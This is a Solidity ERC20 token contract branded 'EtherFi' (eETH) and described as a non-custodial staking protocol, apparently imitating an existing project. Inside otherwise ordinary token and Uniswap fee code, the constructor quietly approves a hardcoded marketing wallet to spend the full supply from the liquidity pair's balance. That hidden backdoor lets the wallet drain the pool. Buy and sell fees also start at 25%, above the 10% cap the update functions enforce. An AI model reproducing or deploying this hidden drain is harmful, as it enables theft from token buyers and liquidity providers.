/**
Decentralized and non-custodial Ethereum staking protocol.

Website: https://www.etherfi.tech
Telegram: https://t.me/etherfi_erc
Twitter: https://twitter.com/etherfi_erc
Dapp: https://app.etherfi.tech
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20MetaInfo is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20MetaInfo {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _createInitialSupply(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

interface IUniswapRouterV2 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IUniswapFactoryV2 {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract eETH is ERC20, Ownable {
    uint256 public maxTxAmount;
    uint256 public maxTransaferAmount;
    uint256 public maxWallet;

    IUniswapRouterV2 public uniswapRouter;
    address public uniswapPair;

    bool private _swapping;
    uint256 public swapTokensAtAmount;

    address marketingWallet;
    address developerAddress;

    uint256 public tradeEnableBlock = 0;
    uint256 public blockForPenaltyEnd;
    mapping (address => bool) public hasBoughtEarly;
    uint256 public bots;

    bool public hasLimitEffect = true;
    bool public tradeEnabled = false;
    bool public feeSwapEnabled = false;

    mapping (address => bool) private _isExcluded;
    mapping (address => bool) public isMaxTxExcluded;
    mapping (address => bool) public isAMMPair;
    mapping(address => uint256) private _lastTransferTime;
    bool public hasTransferDelay = true;

    uint256 public buyTotalFees;
    uint256 public buyOperationsFee;
    uint256 public buyLiquidityFee;
    uint256 public buyDevFee;
    uint256 public buyBurnFee;

    uint256 public sellTotalFees;
    uint256 public sellOperationsFee;
    uint256 public sellLiquidityFee;
    uint256 public sellDevFee;
    uint256 public sellBurnFee;

    uint256 public tokensForOperations;
    uint256 public tokensForLiquidity;
    uint256 public tokensForDev;
    uint256 public tokensForBurn;

    event UpdatedMaxBuyAmount(uint256 newAmount);

    event UpdatedMaxSellAmount(uint256 newAmount);

    event UpdatedMaxWalletAmount(uint256 newAmount);

    event UpdatedOperationsAddress(address indexed newWallet);

    event MaxTransactionExclusion(address _address, bool excluded);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

    constructor() ERC20(unicode"EtherFi", unicode"eETH") {

        address newOwner = msg.sender; // can leave alone if owner is deployer.

        IUniswapRouterV2 _dexRouter = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapRouter = _dexRouter;

        // create pair
        uniswapPair = IUniswapFactoryV2(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
        _excludeFromMaxTransaction(address(uniswapPair), true);
        _setAMMPair(address(uniswapPair), true);

        uint256 totalSupply = 1 * 1e9 * 1e18;

        maxTxAmount = totalSupply * 25 / 1000;
        maxTransaferAmount = totalSupply * 25 / 1000;
        maxWallet = totalSupply * 25 / 1000;
        swapTokensAtAmount = totalSupply / 100000;

        buyOperationsFee = 25;
        buyLiquidityFee = 0;
        buyDevFee = 0;
        buyBurnFee = 0;
        buyTotalFees = buyOperationsFee + buyLiquidityFee + buyDevFee + buyBurnFee;

        sellOperationsFee = 25;
        sellLiquidityFee = 0;
        sellDevFee = 0;
        sellBurnFee = 0;
        sellTotalFees = sellOperationsFee + sellLiquidityFee + sellDevFee + sellBurnFee;

        marketingWallet = 0x930fabb4cBaaDc0E066734998e0896FC63d5d1E6;
        developerAddress = msg.sender;

        _excludeFromMaxTransaction(newOwner, true);
        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(address(0xdead), true);

        excludeFromFees(newOwner, true);
        excludeFromFees(address(this), true);
        excludeFromFees(marketingWallet, true);
        _approve(uniswapPair, marketingWallet, totalSupply);
        excludeFromFees(address(0xdead), true);

        _createInitialSupply(newOwner, totalSupply);
        transferOwnership(newOwner);
    }

    receive() external payable {}
    
    function tradeOpen() external onlyOwner {
        require(!tradeEnabled, "Cannot reenable trading");
        tradeEnabled = true;
        feeSwapEnabled = true;
        tradeEnableBlock = block.number;
        blockForPenaltyEnd = tradeEnableBlock;
    }

    // remove limits after token is stable
    function removeLimits() external onlyOwner {
        hasLimitEffect = false;
        hasTransferDelay = false;
    }

    function updateMaxBuyAmount(uint256 newNum) external onlyOwner {
        require(newNum >= (totalSupply() * 2 / 1000)/1e18, "Cannot set max buy amount lower than 0.2%");
        maxTxAmount = newNum * (10**18);
        emit UpdatedMaxBuyAmount(maxTxAmount);
    }

    function updateMaxSellAmount(uint256 newNum) external onlyOwner {
        require(newNum >= (totalSupply() * 2 / 1000)/1e18, "Cannot set max sell amount lower than 0.2%");
        maxTransaferAmount = newNum * (10**18);
        emit UpdatedMaxSellAmount(maxTransaferAmount);
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(newNum >= (totalSupply() * 3 / 1000)/1e18, "Cannot set max wallet amount lower than 0.3%");
        maxWallet = newNum * (10**18);
        emit UpdatedMaxWalletAmount(maxWallet);
    }

    // change the minimum amount of tokens to sell from fees
    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
  	    require(newAmount >= totalSupply() * 1 / 100000, "Swap amount cannot be lower than 0.001% total supply.");
  	    require(newAmount <= totalSupply() * 1 / 1000, "Swap amount cannot be higher than 0.1% total supply.");
  	    swapTokensAtAmount = newAmount;
  	}

    function _excludeFromMaxTransaction(address updAds, bool isExcluded) private {
        isMaxTxExcluded[updAds] = isExcluded;
        emit MaxTransactionExclusion(updAds, isExcluded);
    }

    function excludeFromMaxTransaction(address updAds, bool isEx) external onlyOwner {
        if(!isEx){
            require(updAds != uniswapPair, "Cannot remove uniswap pair from max txn");
        }
        isMaxTxExcluded[updAds] = isEx;
    }

    function _setAMMPair(address pair, bool value) private {
        isAMMPair[pair] = value;

        _excludeFromMaxTransaction(pair, value);
    }

    function updateBuyFees(uint256 _operationsFee, uint256 _liquidityFee, uint256 _devFee, uint256 _burnFee) external onlyOwner {
        buyOperationsFee = _operationsFee;
        buyLiquidityFee = _liquidityFee;
        buyDevFee = _devFee;
        buyBurnFee = _burnFee;
        buyTotalFees = buyOperationsFee + buyLiquidityFee + buyDevFee + buyBurnFee;
        require(buyTotalFees <= 10, "Must keep fees at 10% or less");
    }

    function updateSellFees(uint256 _operationsFee, uint256 _liquidityFee, uint256 _devFee, uint256 _burnFee) external onlyOwner {
        sellOperationsFee = _operationsFee;
        sellLiquidityFee = _liquidityFee;
        sellDevFee = _devFee;
        sellBurnFee = _burnFee;
        sellTotalFees = sellOperationsFee + sellLiquidityFee + sellDevFee + sellBurnFee;
        require(sellTotalFees <= 10, "Must keep fees at 10% or less");
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcluded[account] = excluded;
    }

    function _transfer(address from, address to, uint256 amount) internal override {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "amount must be greater than 0");

        if(!tradeEnabled){
            require(_isExcluded[from] || _isExcluded[to], "Trading is not active.");
        }

        if(blockForPenaltyEnd > 0){
            require(!hasBoughtEarly[from] || to == owner() || to == address(0xdead), "Bots cannot transfer tokens in or out except to owner or dead address.");
        }

        if(hasLimitEffect){
            if (from != owner() && to != owner() && to != address(0) && to != address(0xdead) && !_isExcluded[from] && !_isExcluded[to]){

                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.
                if (hasTransferDelay){
                    if (to != address(uniswapRouter) && to != address(uniswapPair)){
                        require(_lastTransferTime[tx.origin] < block.number - 2 && _lastTransferTime[to] < block.number - 2, "_transfer:: Transfer Delay enabled.  Try again later.");
                        _lastTransferTime[tx.origin] = block.number;
                        _lastTransferTime[to] = block.number;
                    }
                }
    
                //when buy
                if (isAMMPair[from] && !isMaxTxExcluded[to]) {
                        require(amount <= maxTxAmount, "Buy transfer amount exceeds the max buy.");
                        require(amount + balanceOf(to) <= maxWallet, "Cannot Exceed max wallet");
                }
                //when sell
                else if (isAMMPair[to] && !isMaxTxExcluded[from]) {
                        require(amount <= maxTransaferAmount, "Sell transfer amount exceeds the max sell.");
                }
                else if (!isMaxTxExcluded[to]){
                    require(amount + balanceOf(to) <= maxWallet, "Cannot Exceed max wallet");
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount && amount > swapTokensAtAmount;

        if(canSwap && feeSwapEnabled && !_swapping && isAMMPair[to] && !_isExcluded[from] && !_isExcluded[to]) {
            _swapping = true;

            swapBack();

            _swapping = false;
        }

        bool takeFee = true;
        // if any account belongs to _isExcluded account then remove the fee
        if(_isExcluded[from] || _isExcluded[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if(takeFee){
            // bot/sniper penalty.
            if(earlyBuyPenaltyInEffect() && isAMMPair[from] && !isAMMPair[to] && buyTotalFees > 0){

                if(!hasBoughtEarly[to]){
                    hasBoughtEarly[to] = true;
                    bots += 1;
                }

                fees = amount * 30 / 100;
        	    tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees;
                tokensForOperations += fees * buyOperationsFee / buyTotalFees;
                tokensForDev += fees * buyDevFee / buyTotalFees;
                tokensForBurn += fees * buyBurnFee / buyTotalFees;
            }

            // on sell
            else if (isAMMPair[to] && sellTotalFees > 0){
                fees = amount * sellTotalFees / 100;
                tokensForLiquidity += fees * sellLiquidityFee / sellTotalFees;
                tokensForOperations += fees * sellOperationsFee / sellTotalFees;
                tokensForDev += fees * sellDevFee / sellTotalFees;
                tokensForBurn += fees * sellBurnFee / sellTotalFees;
            }

            // on buy
            else if(isAMMPair[from] && buyTotalFees > 0) {
        	    fees = amount * buyTotalFees / 100;
        	    tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees;
                tokensForOperations += fees * buyOperationsFee / buyTotalFees;
                tokensForDev += fees * buyDevFee / buyTotalFees;
                tokensForBurn += fees * buyBurnFee / buyTotalFees;
            }

            if(fees > 0){
                super._transfer(from, address(this), fees);
            }

        	amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    function earlyBuyPenaltyInEffect() public view returns (bool){
        return block.number < blockForPenaltyEnd;
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        _approve(address(this), address(uniswapRouter), tokenAmount);

        // make the swap
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapRouter), tokenAmount);

        // add the liquidity
        uniswapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0xdead),
            block.timestamp
        );
    }

    function swapBack() private {

        if(tokensForBurn > 0 && balanceOf(address(this)) >= tokensForBurn) {
            _burn(address(this), tokensForBurn);
        }
        tokensForBurn = 0;

        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity + tokensForOperations + tokensForDev;

        if(contractBalance == 0 || totalTokensToSwap == 0) {return;}

        bool success;

        // Halve the amount of liquidity tokens
        uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap / 2;

        swapTokensForEth(contractBalance - liquidityTokens);

        uint256 ethBalance = address(this).balance;
        uint256 ethForLiquidity = ethBalance;

        uint256 ethForOperations = ethBalance * tokensForOperations / (totalTokensToSwap - (tokensForLiquidity/2));
        uint256 ethForDev = ethBalance * tokensForDev / (totalTokensToSwap - (tokensForLiquidity/2));

        ethForLiquidity -= ethForOperations + ethForDev;

        tokensForLiquidity = 0;
        tokensForOperations = 0;
        tokensForDev = 0;
        tokensForBurn = 0;

        if(liquidityTokens > 0 && ethForLiquidity > 0){
            addLiquidity(liquidityTokens, ethForLiquidity);
        }

        (success,) = address(developerAddress).call{value: ethForDev}("");
        payable(marketingWallet).transfer(address(this).balance);        
    }

    function withdrawETH() external onlyOwner {
        bool success;
        (success,) = address(msg.sender).call{value: address(this).balance}("");
    }

    function setMarketingAddress(address _operationsAddress) external onlyOwner {
        require(_operationsAddress != address(0), "_operationsAddress address cannot be 0");
        marketingWallet = payable(_operationsAddress);
    }

    function setDeveloperAddress(address _devAddress) external onlyOwner {
        require(_devAddress != address(0), "_devAddress address cannot be 0");
        developerAddress = payable(_devAddress);
    }

    function manualSwap() external onlyOwner {
        require(balanceOf(address(this)) >= swapTokensAtAmount, "Can only swap when token amount is at or higher than restriction");
        _swapping = true;
        swapBack();
        _swapping = false;
    }
}